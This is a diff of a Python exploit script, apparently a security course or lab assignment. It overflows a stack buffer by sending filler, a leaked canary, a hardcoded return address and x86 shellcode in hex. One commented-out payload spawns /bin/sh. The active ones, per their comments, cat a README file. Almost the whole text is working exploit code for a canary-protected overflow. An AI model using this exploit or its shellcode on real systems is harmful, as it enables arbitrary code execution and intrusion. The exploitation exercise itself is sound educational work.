@@ -47,17 +47,19 @@ canary = reply_canary
 fill2 = "\0"*8
 retaddr = fuck_raddr("bffffaf4") # "bffffaf4"
 #payload = fuck_raddr("6a3158cd8089c389c16a4658cd8031c050682f2f6c73682f62696e545b505389e131d2b00bcd800a", False) # SHELLCODE
+# This payload works! It cat README to stdout. Uncomment print(p.recvline()) to use it.
 payload = fuck_raddr("6a3158cd8089c389c16a4658cd8031c050682f636174682f62696e545b506841444d45682f2f524568652f6a7a682f686f6d545950515389e131d2b00bcd80", False) # SHELLCODE
-#payload = SHELLCODE
+# This payload also works! It cat README to stderr.
+payload = SHELLCODE + '\0'
 
 msg = fill1 + canary + fill2 + retaddr + payload + '\n'
 #print(msg)
 p.send(msg)
-print(p.recvline())
-print(p.recvline())
-print(p.recvline())
-print(p.recvline())
-print(p.recvline())
+#print(p.recvline())
+#print(p.recvline())
+#print(p.recvline())
+#print(p.recvline())
+##print(p.recvline())
 
 # HINT: the last line of your exploit should look something like:
 #   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
